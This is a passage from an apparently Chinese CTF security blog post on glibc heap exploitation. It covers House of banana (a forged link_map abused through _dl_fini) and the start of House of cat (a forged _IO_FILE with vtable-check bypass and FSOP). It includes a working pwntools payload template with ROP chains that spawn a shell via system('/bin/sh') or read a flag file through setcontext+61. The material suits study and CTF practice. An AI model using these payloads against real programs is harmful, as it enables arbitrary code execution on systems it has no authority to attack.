class="number">0x55a65591d040</span>,</span><br><span class="line">......</span><br><span class="line">  l_direct_opencount = <span class="number">1</span>,</span><br><span class="line">  l_type = lt_executable,</span><br><span class="line">  l_relocated = <span class="number">1</span>,</span><br><span class="line">  l_init_called = <span class="number">1</span>,     <span class="comment">//不为0，以绕过判断</span></span><br><span class="line">  l_global = <span class="number">1</span>,</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后来看<code>_dl_fini</code>函数</p>
<p><code>_dl_fini.c</code>中具体函数逻辑如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">maps</span>[<span class="title">nloaded</span>];</span>    </span><br><span class="line"></span><br><span class="line">   <span class="type">unsigned</span> <span class="type">int</span> i;</span><br><span class="line">   <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">   assert (nloaded != <span class="number">0</span> || GL(dl_ns)[ns]._ns_loaded == <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">for</span> (l = GL(dl_ns)[ns]._ns_loaded, i = <span class="number">0</span>; l != <span class="literal">NULL</span>; l = l-&gt;l_next)</span><br><span class="line">     <span class="comment">/* Do not handle ld.so in secondary namespaces.  */</span></span><br><span class="line">     <span class="keyword">if</span> (l == l-&gt;l_real)      <span class="comment">//检查节点的地址是否跟自己结构体保存的一致</span></span><br><span class="line">       &#123;</span><br><span class="line">  assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">  maps[i] = l;</span><br><span class="line">  l-&gt;l_idx = i;</span><br><span class="line">  ++i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bump l_direct_opencount of all objects so that they</span></span><br><span class="line"><span class="comment">     are not dlclose()ed from underneath us.  */</span></span><br><span class="line">  ++l-&gt;l_direct_opencount;</span><br><span class="line">       &#125;</span><br><span class="line">   assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">   assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - <span class="number">1</span>);</span><br><span class="line">   <span class="type">unsigned</span> <span class="type">int</span> nmaps = i;</span><br><span class="line"></span><br><span class="line">   _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line">    <span class="literal">NULL</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">   __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nmaps; ++i)</span><br><span class="line">     &#123;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span> =</span> maps[i];   <span class="comment">//l遍历link_map的链表</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (l-&gt;l_init_called)     <span class="comment">//重要的检查点</span></span><br><span class="line">  &#123;</span><br><span class="line">    l-&gt;l_init_called = <span class="number">0</span>;      </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Is there a destructor function?  */</span></span><br><span class="line">    <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">        || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* When debugging print a message first.  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">         &amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">   _dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line">       DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">       ns);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* First see whether an array is given.  */</span></span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">       (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">         + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);      <span class="comment">//即要调用的函数数组的地址为这两项相加（DT_FINI_ARRAY = 26）</span></span><br><span class="line">     <span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">         / <span class="keyword">sizeof</span> (ElfW(Addr)));     <span class="comment">//i的起始值（DT_FINI_ARRAYSZ = 28）</span></span><br><span class="line">     <span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">       ((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();     <span class="comment">//目标位置</span></span><br><span class="line">   &#125;</span><br><span class="line">....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>从上面可以看到我们需要使<code>l-&gt;l_init_called</code>不为0，<code>l-&gt;l_info[DT_FINI_ARRAY] != NULL || (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != NULL)</code>成立，<code>l-&gt;l_info[DT_FINI_ARRAY] != NULL</code>才能调用函数。</p>
<p>最后配合<code>setcontext+61</code>可getshell或orw</p>
<p>模板来源为第一个参考链接</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">fake_link_map_addr = heap_base + <span class="number">0x6c0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x420</span> + p64(fake_link_map_addr + <span class="number">0x20</span>)) <span class="comment"># l_addr</span></span><br><span class="line">payload = p64(<span class="number">0</span>) +  p64(ld.address + <span class="number">0x2f740</span>) <span class="comment"># l_next</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(fake_link_map_addr) <span class="comment"># l_real</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>) <span class="comment"># second call  rdx = the address of last call</span></span><br><span class="line">payload += p64(ret_addr) <span class="comment"># first call (fake_link_map_addr + 0x38)</span></span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"># getshell</span></span><br><span class="line"><span class="string">payload += p64(pop_rdi_ret) # 0x40</span></span><br><span class="line"><span class="string">payload += p64(next(libc.search(b&#x27;/bin/sh&#x27;)))</span></span><br><span class="line"><span class="string">payload += p64(libc.sym[&#x27;system&#x27;])</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># orw</span></span><br><span class="line">flag_addr = fake_link_map_addr + <span class="number">0xe8</span></span><br><span class="line">payload += p64(pop_rdi_ret) + p64(flag_addr) <span class="comment"># fake_link_map_addr + 0x40</span></span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;syscall&#x27;</span>] + <span class="number">27</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(fake_link_map_addr + <span class="number">0x200</span>)</span><br><span class="line">payload += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>]) <span class="comment"># fake_link_map_addr + 0xc8</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;_exit&#x27;</span>])</span><br><span class="line"> </span><br><span class="line">payload = payload.ljust(<span class="number">0x38</span> - <span class="number">0x10</span> + <span class="number">0xa0</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment"># =&gt; fake_link_map_addr + 0xd8  SROP</span></span><br><span class="line">payload += p64(fake_link_map_addr + <span class="number">0x40</span>) <span class="comment"># rsp</span></span><br><span class="line">payload += p64(ret_addr) <span class="comment"># rip</span></span><br><span class="line">payload += <span class="string">b&#x27;./flag\x00\x00&#x27;</span> <span class="comment"># fake_link_map_addr + 0xe8</span></span><br><span class="line"> </span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># l-&gt;l_info[DT_FINI_ARRAY] != NULL =&gt; l-&gt;l_info[26] != NULL</span></span><br><span class="line">payload += p64(fake_link_map_addr + <span class="number">0x110</span>) + p64(<span class="number">0x10</span>) <span class="comment"># l-&gt;l_info[26]  &amp;  d_ptr = 0x10</span></span><br><span class="line">payload += p64(fake_link_map_addr + <span class="number">0x120</span>) + p64(<span class="number">0x10</span>) <span class="comment"># l-&gt;l_info[28]  &amp;  i = 0x10/8 = 2 =&gt; array[1] = l-&gt;l_addr + d_ptr + 8 =&gt; array[0] = l-&gt;l_addr + d_ptr</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x308</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x800000000</span>) <span class="comment"># l-&gt;l_init_called</span></span><br></pre></td></tr></table></figure></div>

<p>上述模板的调用流程为（以orw为例）：</p>
<p>程序进入<code>exit-&gt;_dl_fini-&gt;(fini_t)array[i]</code>，经<code>l-&gt;l_info[28]-&gt;d_un.d_val 得 i=2</code>，<code>d_un</code>为一个共用体</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">  Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">&#125; d_un;</span><br></pre></td></tr></table></figure></div>

<p>经过<code>while(i-- &gt; 0)</code>，第一个调用的项为<code>array[1]</code>，而经<code>l_addr + l-&gt;l_info[26]-&gt;d_un.d_ptr 得 array = fake_link_map_addr + 0x30</code>，则<code>array[1]</code>为<code>ret_addr</code>，之后则会调用<code>array[0]</code>，即<code>setcontext+61</code>，这个调用过程中，汇编代码为</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fa4750591a3</span>    mov    rdx, r14</span><br><span class="line"><span class="number">0x7fa4750591a6</span>    sub    r14, <span class="number">8</span></span><br><span class="line"><span class="number">0x7fa4750591aa</span>    cmp    qword ptr [rbp - <span class="number">0x38</span>], rdx</span><br><span class="line"><span class="number">0x7fa4750591ae</span>    jne    <span class="number">0x7fa4750591a0</span>                &lt;<span class="number">0x7fa4750591a0</span>&gt;</span><br><span class="line"> ↓</span><br><span class="line"><span class="number">0x7fa4750591a0</span>    call   qword ptr [r14]               &lt;setcontext+<span class="number">61</span>&gt;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在调用<code>setcontext+61</code>之前，会使<code>rdx=r14</code>，然后才有<code>r14-8</code>，则此时<code>rdx=fake_link_map_addr+0x38</code></p>
<p><code>setcontext+61</code>为</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7fa474eae06d</span> &lt;setcontext+<span class="number">61</span>&gt;     mov    rsp, qword ptr [rdx + <span class="number">0xa0</span>]</span><br><span class="line"><span class="number">0x7fa474eae074</span> &lt;setcontext+<span class="number">68</span>&gt;     mov    rbx, qword ptr [rdx + <span class="number">0x80</span>]</span><br><span class="line"><span class="number">0x7fa474eae07b</span> &lt;setcontext+<span class="number">75</span>&gt;     mov    rbp, qword ptr [rdx + <span class="number">0x78</span>]</span><br><span class="line"><span class="number">0x7fa474eae07f</span> &lt;setcontext+<span class="number">79</span>&gt;     mov    r12, qword ptr [rdx + <span class="number">0x48</span>]</span><br><span class="line"><span class="number">0x7fa474eae083</span> &lt;setcontext+<span class="number">83</span>&gt;     mov    r13, qword ptr [rdx + <span class="number">0x50</span>]</span><br><span class="line"><span class="number">0x7fa474eae087</span> &lt;setcontext+<span class="number">87</span>&gt;     mov    r14, qword ptr [rdx + <span class="number">0x58</span>]</span><br><span class="line"><span class="number">0x7fa474eae08b</span> &lt;setcontext+<span class="number">91</span>&gt;     mov    r15, qword ptr [rdx + <span class="number">0x60</span>]</span><br><span class="line"><span class="number">0x7fa474eae08f</span> &lt;setcontext+<span class="number">95</span>&gt;     test   dword ptr fs:[<span class="number">0x48</span>], <span class="number">2</span></span><br><span class="line"><span class="number">0x7fa474eae09b</span> &lt;setcontext+<span class="number">107</span>&gt;    je     setcontext+<span class="number">294</span>                &lt;setcontext+<span class="number">294</span>&gt;</span><br><span class="line"><span class="number">0x7fa474eae156</span> &lt;setcontext+<span class="number">294</span>&gt;    mov    rcx, qword ptr [rdx + <span class="number">0xa8</span>]</span><br><span class="line"><span class="number">0x7fa474eae15d</span> &lt;setcontext+<span class="number">301</span>&gt;    push   rcx</span><br><span class="line"><span class="number">0x7fa474eae15e</span> &lt;setcontext+<span class="number">302</span>&gt;    mov    rsi, qword ptr [rdx + <span class="number">0x70</span>]</span><br><span class="line"><span class="number">0x7fa474eae162</span> &lt;setcontext+<span class="number">306</span>&gt;    mov    rdi, qword ptr [rdx + <span class="number">0x68</span>]</span><br><span class="line"><span class="number">0x7fa474eae166</span> &lt;setcontext+<span class="number">310</span>&gt;    mov    rcx, qword ptr [rdx + <span class="number">0x98</span>]</span><br><span class="line"><span class="number">0x7fa474eae16d</span> &lt;setcontext+<span class="number">317</span>&gt;    mov    r8, qword ptr [rdx + <span class="number">0x28</span>]</span><br><span class="line"><span class="number">0x7fa474eae171</span> &lt;setcontext+<span class="number">321</span>&gt;    mov    r9, qword ptr [rdx + <span class="number">0x30</span>]</span><br><span class="line"><span class="number">0x7fa474eae175</span> &lt;setcontext+<span class="number">325</span>&gt;    mov    rdx, qword ptr [rdx + <span class="number">0x88</span>]</span><br><span class="line"><span class="number">0x7fa474eae17c</span> &lt;setcontext+<span class="number">332</span>&gt;    xor    eax, eax</span><br><span class="line"><span class="number">0x7fa474eae17e</span> &lt;setcontext+<span class="number">334</span>&gt;    ret    </span><br></pre></td></tr></table></figure></div>

<p>在对应位置写入值即可控制对应寄存器，<code>ret</code>后<code>rsp</code>被劫持到了<code>fake_link_map_addr+0x40</code>的位置，直接执行orw</p>
<h2 id="House-of-cat"><a href="#House-of-cat" class="headerlink" title="House of cat"></a>House of cat</h2><p><code>CatF1y</code>师傅发现的一个比较新的技巧，目前适用于任何版本。</p>
<p>参考链接：[<a class="link"   target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273895.htm#msg_header_h3_6" >原创]House of cat新型glibc中IO利用手法解析 &amp;&amp; 第六届强网杯House of cat详解-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com (kanxue.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<ul>
<li><p>利用条件：可以向任意位置写入可控地址，可以泄露libcbase和heapbase，能触发FSOP或__malloc_assert或进入IO流</p>
</li>
<li><p>利用流程：<code>伪造好fake_IO结构体 -&gt; FSOP/__malloc_assert -&gt; _IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode</code></p>
</li>
<li><p>利用原理：通过在任意地址写一个可控地址，伪造<code>fake_IO</code>结构体并配合合适的IO链，来达到控制执行流的效果。</p>
</li>
</ul>
<p>要进行IO利用首先要绕过vtable检查</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>用当前虚表指针减去<code>_IO_vtable</code>段的开始地址，其偏移若大于<code>section_length</code>，则会进入<code>_IO_vtable_check()</code>函数进行更为详细的检查。因此一般修改虚表指针为虚表段内的任意位置，也就是对于某一个<code>_IO_xxx_jumps</code>的任意偏移，从而调用我们想要调用的IO函数。</p>
<h3 id="FSOP触发"><a href="#FSOP触发" class="headerlink" title="FSOP触发"></a>FSOP触发</h3><p>FSOP有三种情况（能从main函数中返回、程序中能执行exit函数、libc中执行abort），第三种情况在高版本中已经删除</p>
<p>从exit进入时的调用链为：<code>exit -&gt; __run_exit_handlers -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode</code></p>
<p>在<code>_IO_flush_all_lockp</code>函数中有这样几个片段</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7f9ab615a9db</span> &lt;_IO_flush_all_lockp+<span class="number">123</span>&gt;    mov    r15, qword ptr [rip + <span class="number">0x18bc9e</span>] &lt;_IO_list_all&gt;</span><br><span class="line"><span class="number">0x7f0f3fbd2a21</span> &lt;_IO_flush_all_lockp+<span class="number">193</span>&gt;    mov    rax, qword ptr [r15 + <span class="number">0xd8</span>]</span><br><span class="line"><span class="number">0x7f53be3b5a3f</span> &lt;_IO_flush_all_lockp+<span class="number">223</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]        &lt;_IO_wfile_seekoff&gt;</span><br></pre></td></tr></table></figure></div>

<p>也就是说程序会把<code>_IO_list_all</code>对应的值赋给r15，因此<code>_IO_list_all</code>处就要伪造成我们的可控地址，然后把对应结构中的0xd8位置的值赋给rax，之后会调用rax+0x18位置的函数，因此0xd8位置就要伪造为<code>_IO_wfile_jumps+0x30</code>（0x48位置为<code>_IO_wfile_seekoff</code>）</p>
<p>进入<code>_IO_wfile_seekoff</code>之后，会以<code>rdi = fake_io_addr</code>进入<code>_IO_switch_to_wget_mode</code>函数</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">_IO_switch_to_wget_mode (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">wint_t</span>)_IO_WOVERFLOW (fp, WEOF) == WEOF)</span><br><span class="line">      <span class="keyword">return</span> EOF;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在这个函数中，会调用<code>_IO_WOVERFLOW</code>函数，而对其并没有任何检查，只要我们可以更改该函数指针所在位置的值为<code>setcontext+61</code>就可以实现控制执行流</p>
<p>对应汇编代码如下</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x7f53be3aad34</span> &lt;_IO_switch_to_wget_mode+<span class="number">4</span>&gt;     mov    rax, qword ptr [rdi + <span class="number">0xa0</span>]</span><br><span class="line">  <span class="number">0x7f53be3aad3b</span> &lt;_IO_switch_to_wget_mode+<span class="number">11</span>&gt;    push   rbx</span><br><span class="line">  <span class="number">0x7f53be3aad3c</span> &lt;_IO_switch_to_wget_mode+<span class="number">12</span>&gt;    mov    rbx, rdi</span><br><span class="line">  <span class="number">0x7f53be3aad3f</span> &lt;_IO_switch_to_wget_mode+<span class="number">15</span>&gt;    mov    rdx, qword ptr [rax + <span class="number">0x20</span>]</span><br><span class="line">► <span class="number">0x7f53be3aad43</span> &lt;_IO_switch_to_wget_mode+<span class="number">19</span>&gt;    cmp    rdx, qword ptr [rax + <span class="number">0x18</span>]</span><br><span class="line">  <span class="number">0x7f53be3aad47</span> &lt;_IO_switch_to_wget_mode+<span class="number">23</span>&gt;    jbe    _IO_switch_to_wget_mode+<span class="number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="number">56</span>&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x7f53be3aad49</span> &lt;_IO_switch_to_wget_mode+<span class="number">25</span>&gt;    mov    rax, qword ptr [rax + <span class="number">0xe0</span>]</span><br><span class="line">  <span class="number">0x7f53be3aad50</span> &lt;_IO_switch_to_wget_mode+<span class="number">32</span>&gt;    mov    esi, <span class="number">0xffffffff</span></span><br><span class="line">  <span class="number">0x7f53be3aad55</span> &lt;_IO_switch_to_wget_mode+<span class="number">37</span>&gt;    call   qword ptr [rax + <span class="number">0x18</span>]</span><br></pre></td></tr></table></figure></div>

<p>显然 <strong>rax &#x3D; [fake_io_addr + 0xa0]</strong></p>
<p>在造成任意地址写一个堆地址的基础上，这里的寄存器rdi（fake_IO的地址）、rax和rdx都是我们可以控制的，在开启沙箱的情况下，假如把最后调用的**[rax + 0x18]设置为setcontext，把rdx设置为可控的堆地址，就能执行srop来读取flag<strong>；如果</strong>未开启沙箱<strong>，则只需把</strong>最后调用的[rax + 0x18]设置为system函数，把fake_IO的头部写入&#x2F;bin&#x2F;sh字符串**，就可执行system(“&#x2F;bin&#x2F;sh”)</p>
<h3 id="malloc-assert触发"><a href="#malloc-assert触发" class="headerlink" title="__malloc_assert触发"></a>__malloc_assert触发</h3>
        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Glibc堆学习及_IO_FILE利用</li>
        <li><strong>Author:</strong> Static</li>
        <li><strong>Created at
                :</strong> 2024-01-23 15:51:11</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2023-11-12 15:54:28
            </li>
        
        <li>
            <strong>Link:</strong> https://staticccccccc.github.io/2024/01/23/Glibc堆学习/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/UAF-Unlink-Unsortedbin-attack-Largebin-attack-Tcache-stashing-unlink-attack-House-of-einherjar-IO-FILE-attack-House-of-botcake-House-of-orange-House-of-corrosion-House-of-banana-House-of-cat/">#UAF Unlink Unsortedbin_attack Largebin_attack Tcache_stashing_unlink_attack House_of_einherjar IO_FILE_attack House_of_botcake House_of_orange House_of_corrosion House_of_banana House_of_cat</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2024/01/23/kernel%E5%85%A5%E9%97%A8(1)%E4%B9%8Bcore/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">kernel入门(1)之core</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          requiredMeta: ['nick', 'mail'],
          emoji: [],
          recaptchaV3Key: "wasd",
          
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">Glibc堆学习及_IO_FILE利用</div>
